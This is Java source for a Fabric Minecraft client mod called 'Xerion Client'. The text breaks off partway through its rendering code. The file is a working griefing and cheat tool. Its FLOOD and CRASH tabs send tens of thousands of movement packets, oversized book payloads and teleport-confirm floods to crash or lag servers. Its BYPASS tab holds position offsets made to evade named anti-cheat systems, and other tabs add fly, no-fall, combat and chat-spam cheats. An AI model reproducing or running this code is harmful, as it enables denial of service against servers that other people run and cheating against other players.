package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.MathHelper;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Palette ──────────────────────────────────────────────────────────
    private static final int C_BG    = 0xFF000508;
    private static final int C_PANEL = 0xF2000A1E;
    private static final int C_BLUE  = 0x00AAFF;
    private static final int C_CYAN  = 0x00DDFF;
    private static final int C_DBLUE = 0x003366;
    private static final int C_GOLD  = 0xFFD700;
    private static final int C_RED   = 0xFF2200;
    private static final int C_GREEN = 0x00FF88;
    private static final int C_ORNG  = 0xFF7700;

    // ── Layout ───────────────────────────────────────────────────────────
    private static final int PW=600,PH=430,TH=32,TABH=22;

    // ── Tabs ─────────────────────────────────────────────────────────────
    private static final String[] TABS = {"⚡FLOOD","🔓BYPASS","💥EXPLOIT","☠ CRASH","⚔COMBAT","🏃MOVE","💬CHAT"};
    private static final int NT = 7;
    private static final int[] TC = {0x00AAFF,0x00FF88,0xFF6600,0xFF0033,0xFF3300,0xFFAA00,0x0088FF};
    private int tab=0;
    private float[] tabGlow = new float[NT];
    private float tabSlide = 1f;

    // ── Bypass ────────────────────────────────────────────────────────────
    private static final String[] BP = {"OFF","BURST","WAVE","NCP","MATRIX","AAC","GRIM","GHOST","CRASHPASS"};
    private int bypass=0;

    // ── Settings ─────────────────────────────────────────────────────────
    private int   delay=0, burst=1, speed=1;
    private boolean unlimited=false;
    private int   exploitType=0, crashType=0;
    private TextFieldWidget numField, chatField;

    // ── Status ────────────────────────────────────────────────────────────
    private String statusText="Xerion Client  v1.0  ●  Ready";
    private int    statusColor=0xFF00AAFF, statusTimer=0;

    // ── Animation ─────────────────────────────────────────────────────────
    private long  tick=0;
    private float glow=0f; private boolean glowUp=true;
    private float hue=0f;
    private float scanA=0f, scanB=0f;
    private float hexOff=0f;
    private float hypeSmooth=0f;   // smoothed hype level

    // ── Particles ─────────────────────────────────────────────────────────
    private static final int PCNT=260;
    private final float[] ppx=new float[PCNT],ppy=new float[PCNT];
    private final float[] pvx=new float[PCNT],pvy=new float[PCNT];
    private final float[] psz=new float[PCNT],pal=new float[PCNT];
    private final float[] pph=new float[PCNT];
    private final int[]   pct=new int[PCNT];

    // ── Mouse trail ───────────────────────────────────────────────────────
    private record TrailPt(int x,int y,int color,float life){}
    private final List<TrailPt> trail = new ArrayList<>();
    private int lastMx=-1, lastMy=-1;

    // ── Data streams (matrix rain) ────────────────────────────────────────
    private static final String DS="XERION01CLIENT10BYPASS11CRASH00PACKET";
    private final float[] dsX=new float[75],dsY=new float[75],dsSp=new float[75];
    private final int[]   dsCh=new int[75];

    // ── Hype burst particles ───────────────────────────────────────────────
    private final List<float[]> burst2 = new ArrayList<>();

    private final Random rng=new Random();

    // ═══════════════════════════════════════════════════════════════════════
    public ProfessorScreen() {
        super(Text.literal("Xerion Client"));
        initParticles(); initStreams();
    }

    @Override protected void init() {
        initParticles(); initStreams(); rebuild();
        ProfessorMusicManager.onOpen(client);
    }
    @Override public void removed()   { ProfessorMusicManager.onClose(client); super.removed(); }
    @Override public boolean shouldPause() { return false; }

    // ── Init helpers ─────────────────────────────────────────────────────
    private void initParticles(){
        for(int i=0;i<PCNT;i++){ppx[i]=rng.nextFloat()*1920;ppy[i]=rng.nextFloat()*1080;pvx[i]=(rng.nextFloat()-.5f)*.5f;pvy[i]=-(rng.nextFloat()*.7f+.1f);psz[i]=rng.nextFloat()*3+.5f;pal[i]=rng.nextFloat()*.85f+.15f;pph[i]=rng.nextFloat()*6.28f;pct[i]=rng.nextInt(5);}
    }
    private void initStreams(){
        for(int i=0;i<75;i++){dsX[i]=i*(width/75f);dsY[i]=rng.nextFloat()*-height;dsSp[i]=rng.nextFloat()*1.4f+.4f;dsCh[i]=rng.nextInt(DS.length());}
    }

    // ── Widget rebuild ────────────────────────────────────────────────────
    private void rebuild(){
        clearChildren(); numField=null; chatField=null;
        int cx=width/2,bpx=cx-PW/2,bpy=height/2-PH/2;
        int tabW=(PW-12)/NT;
        for(int i=0;i<NT;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),b->switchTab(idx)).dimensions(bpx+6+i*(tabW+1),bpy+TH+4,tabW,TABH).build());}
        switch(tab){
            case 0->buildFlood(cx,bpy);
            case 1->buildBypass(cx,bpy,bpx);
            case 2->buildExploit(cx,bpy);
            case 3->buildCrash(cx,bpy);
            case 4->buildCombat(cx,bpy);
            case 5->buildMove(cx,bpy);
            case 6->buildChat(cx,bpy);
        }
        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->close()).dimensions(cx-40,bpy+PH-26,80,18).build());
    }

    private void switchTab(int t){if(t==tab)return;tab=t;tabSlide=0f;rebuild();}

    // ── TAB 0: FLOOD ─────────────────────────────────────────────────────
    private void buildFlood(int cx,int bpy){
        int y=bpy+68,bw=240;
        addDrawableChild(ButtonWidget.builder(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"),b->{unlimited=!unlimited;b.setMessage(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"));}).dimensions(cx-bw/2,y,bw,18).build());
        numField=new TextFieldWidget(textRenderer,cx-60,y+22,120,16,Text.empty());numField.setMaxLength(9);numField.setText("10000");addSelectableChild(numField);
        int[][] presets={{1000,-160},{10000,-55},{100000,50},{1000000,155}};
        for(int[] p:presets){int n=p[0];addDrawableChild(ButtonWidget.builder(Text.literal(n>=1000000?"1M":n>=1000?(n/1000)+"K":""+n),b->numField.setText(""+n)).dimensions(cx+p[1]-26,y+42,52,14).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: "+BP[bypass]),b->{bypass=(bypass+1)%BP.length;b.setMessage(Text.literal("Bypass: "+BP[bypass]));}).dimensions(cx-bw/2,y+60,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Delay: "+delay+"ms  [click]"),b->{delay=(delay+5)%55;b.setMessage(Text.literal("Delay: "+delay+"ms  [click]"));}).dimensions(cx-bw/2,y+80,bw,14).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(">>> SEND PACKETS <<<"),b->doFlood()).dimensions(cx-120,y+100,240,22).build());
    }

    // ── TAB 1: BYPASS ────────────────────────────────────────────────────
    private static final String[] BP_INFO={
        "No bypass  — raw packets",
        "Short Y-burst  0.0625 every 3rd pkt",
        "Sine-wave Y  ~0.08 amplitude",
        "NCP  multi-pattern spoofing",
        "Matrix  4-step Y pattern",
        "AAC  sine + burst hybrid",
        "Grim  vanilla-like  sparse jumps",
        "Ghost  minimal footprint",
        "CrashPass  extreme obfuscation + flood"
    };
    private void buildBypass(int cx,int bpy,int bpx){
        for(int i=0;i<BP.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((bypass==idx?"▶ ":"")+BP[i]+"   "+BP_INFO[i]),b->{bypass=idx;rebuild();}).dimensions(bpx+12,bpy+68+i*22,PW-24,18).build());}
    }

    // ── TAB 2: EXPLOIT ───────────────────────────────────────────────────
    private static final String[] EXP_NAMES={"Swing Flood  — spam arm swing packets","Slot Spam  — cycle hotbar 0→8 rapidly","Teleport Ack  — fake confirm IDs 0→N","Move Flood  — micro-jitter position","Interact Flood  — rapid use-item"};
    private void buildExploit(int cx,int bpy){
        for(int i=0;i<EXP_NAMES.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((exploitType==idx?"▶ ":"")+EXP_NAMES[idx]),b->{exploitType=idx;rebuild();}).dimensions(cx-220,bpy+68+i*20,440,16).build());}
        numField=new TextFieldWidget(textRenderer,cx-60,bpy+178,120,16,Text.empty());numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE ]"),b->doExploit()).dimensions(cx-100,bpy+198,200,22).build());
    }

    // ── TAB 3: CRASH ─────────────────────────────────────────────────────
    private static final String[] CR_NAMES={
        "Packet Crash  — massive packet flood to overload handler",
        "NBT Crash  — deeply nested NBT payload in creative slot",
        "Book Crash  — book with 50+ long pages via update packet",
        "Entity Crash  — interact packet loop for invalid entity IDs",
        "Tick Lag  — complex packet sequence to delay server tick",
        "Move Spam  — extreme coordinate move packets",
        "Chat Flood  — saturate chat handler",
        "Teleport Bomb  — rapid teleport confirm sequence"
    };
    private void buildCrash(int cx,int bpy){
        for(int i=0;i<CR_NAMES.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((crashType==idx?"▶ ":"")+CR_NAMES[idx]),b->{crashType=idx;rebuild();}).dimensions(cx-220,bpy+68+i*21,440,17).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE CRASH ]"),b->doCrash()).dimensions(cx-100,bpy+250,200,22).build());
    }

    // ── TAB 4: COMBAT ────────────────────────────────────────────────────
    private void buildCombat(int cx,int bpy){
        int bw=360,bx=cx-bw/2,y=bpy+68;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Hit Spam  —  200 swing packets + bypass"),b->combatHit()).dimensions(bx,y,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Crit Exploit  —  0.42 Y-jump then hit"),b->combatCrit()).dimensions(bx,y+22,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Anti-KB  —  100 same-pos packets"),b->combatAKB()).dimensions(bx,y+44,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Fast Use  —  80 off-hand use packets"),b->combatFU()).dimensions(bx,y+66,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Burst: "+burst+"x"),b->{burst=burst%5+1;b.setMessage(Text.literal("Burst: "+burst+"x"));}).dimensions(cx-50,y+92,100,16).build());
    }

    // ── TAB 5: MOVE ──────────────────────────────────────────────────────
    private void buildMove(int cx,int bpy){
        int bw=360,bx=cx-bw/2,y=bpy+68;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Speed Boost  —  forward arc move packets"),b->moveSpd()).dimensions(bx,y,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Blink  —  flush held position packets"),b->moveBlink()).dimensions(bx,y+22,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Fly Exploit  —  onGround=false upward Y"),b->moveFly()).dimensions(bx,y+44,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  NoFall  —  onGround=true full fall"),b->moveNF()).dimensions(bx,y+66,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Speed: "+speed+"x"),b->{speed=speed%10+1;b.setMessage(Text.literal("Speed: "+speed+"x"));}).dimensions(cx-50,y+92,100,16).build());
    }

    // ── TAB 6: CHAT ──────────────────────────────────────────────────────
    private void buildChat(int cx,int bpy){
        chatField=new TextFieldWidget(textRenderer,cx-160,bpy+74,320,18,Text.empty());chatField.setMaxLength(256);chatField.setText("/gamemode creative");addSelectableChild(chatField);
        numField=new TextFieldWidget(textRenderer,cx-60,bpy+98,120,16,Text.empty());numField.setMaxLength(6);numField.setText("50");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("SPAM CHAT"),b->doChat()).dimensions(cx-90,bpy+120,180,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("SEND AS COMMAND"),b->doCmd()).dimensions(cx-90,bpy+146,180,18).build());
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  ACTIONS
    // ═══════════════════════════════════════════════════════════════════════
    private int parseN(){try{return Math.max(1,Integer.parseInt(numField!=null?numField.getText():"100"));}catch(Exception e){return 100;}}
    private void flash(String t,int c){statusText=t;statusColor=c;statusTimer=140;}

    private void doFlood(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        int n=unlimited?50000:parseN();
        for(int i=0;i<n;i++){
            client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),(i%2==0)));
            if(bypass>0&&i%3==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        flash("⚡ Sent "+n+" packets  ["+BP[bypass]+"]",0xFF00AAFF);
        triggerHypeBurst();
    }

    private void doExploit(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        int n=parseN();
        switch(exploitType){
            case 0->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));flash("Swing: "+n,0xFF00FF88);}
            case 1->{for(int i=0;i<Math.min(n,500);i++)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));flash("Slot spam: "+Math.min(n,500),0xFF00FF88);}
            case 2->{for(int i=0;i<Math.min(n,300);i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("Teleport ack: "+Math.min(n,300),0xFF00FF88);}
            case 3->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.008,client.player.getY(),client.player.getZ()+rng.nextGaussian()*.008,true));flash("Move flood: "+n,0xFF00FF88);}
            case 4->{for(int i=0;i<Math.min(n,400);i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Interact: "+Math.min(n,400),0xFF00FF88);}
        }
        triggerHypeBurst();
    }

    private void doCrash(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        switch(crashType){
            case 0->{// Packet Crash — 100k rapid packets
                for(int i=0;i<100000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),(i%2==0)));
                flash("☠ PACKET CRASH: 100k packets sent",0xFFFF0033);}
            case 1->{// NBT Crash — book with huge string content
                List<String> pages=new java.util.ArrayList<>();
                String bigStr="§l§n§o§r§k§m§l".repeat(20)+"XERION_NBT_CRASH_".repeat(500);
                for(int i=0;i<50;i++)pages.add(bigStr);
                try{client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pages,java.util.Optional.empty()));}catch(Exception e){flash("NBT: unsupported in this version",0xFFFF7700);break;}
                flash("☠ NBT CRASH: 50 pages × 7000 chars",0xFFFF0033);}
            case 2->{// Book Crash — max pages
                List<String> pages=new java.util.ArrayList<>();
                String page="Xerion Client Book Crash".repeat(100);
                for(int i=0;i<100;i++)pages.add(page);
                try{client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pages,java.util.Optional.of("Xerion")));}catch(Exception e){flash("Book: unsupported",0xFFFF7700);break;}
                flash("☠ BOOK CRASH: 100 pages sent",0xFFFF0033);}
            case 3->{// Entity interact loop (invalid entity IDs)
                for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));
                flash("☠ ENTITY CRASH: 5k interact packets",0xFFFF0033);}
            case 4->{// Tick Lag — alternating complex packets
                for(int i=0;i<10000;i++){
                    client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+i*.0001,client.player.getY()+bypassDY(i),client.player.getZ()+i*.0001,(i%3==0)));
                    if(i%5==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                    if(i%7==0)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
                }
                flash("☠ TICK LAG: 10k complex packets",0xFFFF0033);}
            case 5->{// Move spam with extreme coords
                for(int i=0;i<50000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextDouble()*1e6,client.player.getY(),client.player.getZ()+rng.nextDouble()*1e6,true));
                flash("☠ MOVE SPAM: 50k extreme coords",0xFFFF0033);}
            case 6->{// Chat flood
                String msg="XERION";
                for(int i=0;i<200;i++)client.getNetworkHandler().sendChatMessage(msg+" "+i);
                flash("☠ CHAT FLOOD: 200 messages",0xFFFF0033);}
            case 7->{// Teleport bomb
                for(int i=0;i<10000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(65536)));
                flash("☠ TELEPORT BOMB: 10k ack packets",0xFFFF0033);}
        }
        triggerHypeBurst();
    }

    private void combatHit(){if(client==null||client.getNetworkHandler()==null)return;for(int i=0;i<200;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Hit spam × 200",0xFFFF3300);triggerHypeBurst();}
    private void combatCrit(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;for(int i=0;i<50;i++){double dy=i%2==0?.42:0;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+dy,client.player.getZ(),false));}flash("Crit exploit × 50",0xFFFF3300);}
    private void combatAKB(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;for(int i=0;i<100;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("Anti-KB × 100",0xFFFF3300);}
    private void combatFU(){if(client==null||client.getNetworkHandler()==null)return;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));flash("Fast use × 80",0xFFFF3300);}
    private void moveSpd(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;double sp=speed*.4;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+sp*Math.cos(i*.08),client.player.getY(),client.player.getZ()+sp*Math.sin(i*.08),true));flash("Speed "+speed+"x sent",0xFFFFAA00);}
    private void moveBlink(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;for(int i=0;i<30;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("Blink flushed",0xFFFFAA00);}
    private void moveFly(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;for(int i=0;i<60;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+i*.05,client.player.getZ(),false));flash("Fly packets × 60",0xFFFFAA00);}
    private void moveNF(){if(client==null||client.getNetworkHandler()==null||client.player==null)return;for(int i=0;i<100;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("NoFall × 100",0xFFFFAA00);}
    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String m=chatField.getText();int n=parseN();for(int i=0;i<n;i++)client.getNetworkHandler().sendChatMessage(m);flash("Chat spam × "+n,0xFF0088FF);}
    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String c=chatField.getText().startsWith("/")?chatField.getText().substring(1):chatField.getText();client.getNetworkHandler().sendCommand(c);flash("Command: /"+c,0xFF0088FF);}

    private double bypassDY(int i){return switch(bypass){
        case 1->(i%3==0)?.0625:0;
        case 2->Math.sin(i*.3)*.08;
        case 3->(i%5==0)?.0625:(i%3==0)?.03125:0;
        case 4->(i%4==0)?.1:(i%4==1)?.05:0;
        case 5->Math.sin(i*.2)*.05+((i%7==0)?.0625:0);
        case 6->(i%10==0)?.0625:0;
        case 7->(i%20==0)?.03125:0;
        case 8->Math.sin(i*.15)*.12+Math.cos(i*.3)*.06+((i%5==0)?.0625:0);
        default->0;
    };}

    private void triggerHypeBurst(){
        for(int i=0;i<80;i++){
            float ang=(float)(rng.nextFloat()*Math.PI*2);
            float sp=rng.nextFloat()*6+2;
            burst2.add(new float[]{width/2f,height/2f,(float)(Math.cos(ang)*sp),(float)(Math.sin(ang)*sp),rng.nextFloat()*40+20,1f,(float)rng.nextInt(3)});
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  RENDER
    // ═══════════════════════════════════════════════════════════════════════
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        tabSlide=Math.min(1f,tabSlide+.09f);
        glow+=glowUp?.032f:-.032f; if(glow>=1f){glow=1f;glowUp=false;}else if(glow<=0f){glow=0f;glowUp=true;}
        hue=(hue+.004f)%1f; scanA=(scanA+2f)%height; scanB=(scanB+1.2f)%height;
        hexOff+=.018f;
        for(int i=0;i<NT;i++) tabGlow[i]=Math.max(0f,tabGlow[i]-(i==tab?.0f:.05f));
        tabGlow[tab]=Math.min(1f,tabGlow[tab]+.09f);
        if(statusTimer>0)statusTimer--;

        // Music hype
        float hypeTarget=ProfessorMusicManager.getHypeLevel();
        hypeSmooth=hypeSmooth*.88f+hypeTarget*.12f;
        float hype=hypeSmooth;

        int W=width,H=height,cx=W/2,cy=H/2;
        int bpx=cx-PW/2,bpy=cy-PH/2;

        // ── BG ────────────────────────────────────────────────────────────
        ctx.fill(0,0,W,H,C_BG);

        // Diagonal hex grid (speed up with hype)
        float gspeed=hexOff*(1f+hype*3f);
        for(int x2=(int)(-gspeed%48);x2<W+H;x2+=48){int ha=(int)(6+4*Math.sin(gspeed*.1f+x2*.06f)+(int)(12*hype));ctx.fill(x2%W,0,x2%W+1,H,(ha<<24)|C_DBLUE);}
        for(int y2=(int)(-gspeed%48);y2<H;y2+=48){int ha=(int)(6+4*Math.sin(gspeed*.1f+y2*.06f)+(int)(12*hype));ctx.fill(0,y2,W,y2+1,(ha<<24)|C_DBLUE);}

        // ── Particles ─────────────────────────────────────────────────────
        float pspeed=1f+hype*3f;
        for(int i=0;i<PCNT;i++){
            ppx[i]+=pvx[i]*pspeed; ppy[i]+=pvy[i]*pspeed; pph[i]+=.045f;
            if(ppy[i]<-8){ppy[i]=H+5;ppx[i]=rng.nextFloat()*W;}
            if(ppx[i]<0)ppx[i]=W; if(ppx[i]>W)ppx[i]=0;
            float tw=(MathHelper.sin(pph[i])+1f)/2f;
            int a=(int)(pal[i]*tw*255); if(a<10) continue;
            int col=switch(pct[i]){
                case 1->(a<<24)|0x0055FF; case 2->(a<<24)|0x00AAFF; case 3->(a<<24)|C_GOLD;
                case 4->(a<<24)|0x0033CC;  default->(a<<24)|C_CYAN;
            };
            int sz=psz[i]>2.5f?2:1; ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,col);
        }

        // ── Hype burst ────────────────────────────────────────────────────
        burst2.removeIf(b->b[5]<=0f);
        for(float[] b:burst2){
            b[0]+=b[2]; b[1]+=b[3]; b[3]+=.15f; b[5]-=.025f;
            int ba=(int)(b[5]*200); if(ba<10) continue;
            int bc=switch((int)b[6]){case 1->(ba<<24)|0xFF2200;case 2->(ba<<24)|C_GOLD;default->(ba<<24)|C_CYAN;};
            ctx.fill((int)b[0],(int)b[1],(int)b[0]+3,(int)b[1]+3,bc);
        }

        // ── Data streams ─────────────────────────────────────────────────
        for(int i=0;i<75;i++){
            dsY[i]+=dsSp[i]*(1f+hype*2f); if(dsY[i]>H+20){dsY[i]=-24;dsCh[i]=rng.nextInt(DS.length());}
            if(rng.nextInt(20)==0)dsCh[i]=rng.nextInt(DS.length());
            if(dsY[i]<0)continue;
            int da=(int)(50+30*glow+(int)(60*hype));
            ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],(Math.min(255,da*2)<<24)|0x0077FF,false);
            if(dsY[i]>14)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i]-14,(da/5<<24)|0x001133,false);
        }

        // Scanlines
        ctx.fill(0,(int)scanA,W,(int)scanA+2,0x0DFFFFFF);
        ctx.fill(0,(int)scanB,W,(int)scanB+1,0x07FFFFFF);

        // ── Hype vignette flash ────────────────────────────────────────────
        if(hype>0.6f){
            int hva=(int)((hype-.6f)*2.5f*80);
            ctx.fill(0,0,W,H,(hva<<24)|0x0022FF);
        }

        // ── Mouse trail ────────────────────────────────────────────────────
        if(mx!=lastMx||my!=lastMy){
            int tc=TC[tab]; trail.add(new TrailPt(mx,my,tc,1f));
            // Extra sparkles
            for(int i=0;i<3;i++){
                int sx=mx+(int)((rng.nextFloat()-.5f)*12),sy=my+(int)((rng.nextFloat()-.5f)*12);
                trail.add(new TrailPt(sx,sy,i%2==0?C_GOLD:C_CYAN,.5f));
            }
            lastMx=mx; lastMy=my;
        }
        trail.replaceAll(t->new TrailPt(t.x(),t.y(),t.color(),(float)(t.life()-.04)));
        trail.removeIf(t->t.life()<=0f);
        for(TrailPt t:trail){
            int ta=(int)(t.life()*t.life()*180); if(ta<10) continue;
            ctx.fill(t.x()-1,t.y()-1,t.x()+2,t.y()+2,(ta<<24)|(t.color()));
        }

        // ── Panel shadow ──────────────────────────────────────────────────
        ctx.fill(bpx+8,bpy+8,bpx+PW+8,bpy+PH+8,0x88000000);
        ctx.fill(bpx+4,bpy+4,bpx+PW+4,bpy+PH+4,0x44000000);

        // ── Panel body ────────────────────────────────────────────────────
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,C_PANEL);
        for(int y=0;y<PH;y+=3){int ga=(int)((8+4*hype)*(1f-(float)y/PH));ctx.fill(bpx,bpy+y,bpx+PW,bpy+y+3,(ga<<24)|0x0066FF);}

        // ── Panel border ──────────────────────────────────────────────────
        float hrad=hue*6.28f;
        int bG=Math.max(80,Math.min(240,(int)(150+90*Math.sin(hrad))));
        int bBA=(int)((0.65f+.35f*glow+.2f*hype)*255); bBA=Math.min(255,bBA);
        int borderC=(bBA<<24)|((bG<<8)|0xFF);
        ctx.fill(bpx,bpy,bpx+PW,bpy+2,borderC);ctx.fill(bpx,bpy+PH-2,bpx+PW,bpy+PH,borderC);
        ctx.fill(bpx,bpy,bpx+2,bpy+PH,borderC);ctx.fill(bpx+PW-2,bpy,bpx+PW,bpy+PH,borderC);
        // Inner glow
        int ih2=(int)((0.18f+hype*.2f)*255);
        ctx.fill(bpx+2,bpy+2,bpx+PW-2,bpy+3,(ih2<<24)|0x88CCFF);
        ctx.fill(bpx+2,bpy+PH-3,bpx+PW-2,bpy+PH-2,(ih2<<24)|0x88CCFF);

        // Gold corner brackets
        int gcc2=(0xDD<<24)|C_GOLD; int cs=26;
        ctx.fill(bpx,bpy,bpx+cs,bpy+3,gcc2);ctx.fill(bpx,bpy,bpx+3,bpy+cs,gcc2);
        ctx.fill(bpx+PW-cs,bpy,bpx+PW,bpy+3,gcc2);ctx.fill(bpx+PW-3,bpy,bpx+PW,bpy+cs,gcc2);
        ctx.fill(bpx,bpy+PH-3,bpx+cs,bpy+PH,gcc2);ctx.fill(bpx,bpy+PH-cs,bpx+3,bpy+PH,gcc2);
        ctx.fill(bpx+PW-cs,bpy+PH-3,bpx+PW,bpy+PH,gcc2);ctx.fill(bpx+PW-3,bpy+PH-cs,bpx+PW,bpy+PH,gcc2);

        // ── Title bar ─────────────────────────────────────────────────────
        ctx.fill(bpx,bpy,bpx+PW,bpy+TH,0x33001155);
        String t1="XERION",t2=" CLIENT";
        int tw1=textRenderer.getWidth(t1),tw2=textRenderer.getWidth(t2);
        int tx=cx-(tw1+tw2)/2,ty=bpy+8;
        int tA=(int)(180+75*glow+40*hype); tA=Math.min(255,tA);
        for(int d=-4;d<=4;d++){int ga=(int)Math.max(0,24-Math.abs(d)*6+(int)(hype*20));if(ga>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(ga<<24)|C_BLUE,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(ga<<24)|C_BLUE,false);}}
        ctx.drawText(textRenderer,t1,tx,ty,(tA<<24)|C_CYAN,false);
        ctx.drawText(textRenderer,t2,tx+tw1,ty,(tA<<24)|C_GOLD,false);
        // Subtitle
        String sub="v1.0  ⬡  "+NT+" Modules  ⬡  "+BP.length+" Bypass  ⬡  © Xerion Client";
        int sA2=(int)(100+55*glow+(int)(60*hype));
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,ty+11,(sA2<<24)|C_DBLUE,false);

        // Gold divider
        ctx.fill(bpx+25,bpy+TH-2,bpx+PW-25,bpy+TH-1,(0x66<<24)|C_GOLD);

        // ── Tab bar ───────────────────────────────────────────────────────
        ctx.fill(bpx,bpy+TH,bpx+PW,bpy+TH+TABH+8,0x33000022);
        int tabW2=(PW-12)/NT;
        for(int i=0;i<NT;i++){
            int tg2=(int)(tabGlow[i]*255);
            if(tg2>0){
                int tc2=TC[i];
                ctx.fill(bpx+6+i*(tabW2+1),bpy+TH,bpx+6+(i+1)*(tabW2+1)-1,bpy+TH+TABH+8,(tg2/4<<24)|tc2);
                ctx.fill(bpx+6+i*(tabW2+1),bpy+TH+TABH+5,bpx+6+(i+1)*(tabW2+1)-1,bpy+TH+TABH+8,(tg2<<24)|tc2);
            }
        }
        ctx.fill(bpx+6,bpy+TH+TABH+7,bpx+PW-6,bpy+TH+TABH+8,(0x99<<24)|C_BLUE);

        // ── Music hype bar ────────────────────────────────────────────────
        if(ProfessorMusicManager.isPlaying(client)){
            int mbw=PW-60,mbx=bpx+30,mby=bpy+PH-46;
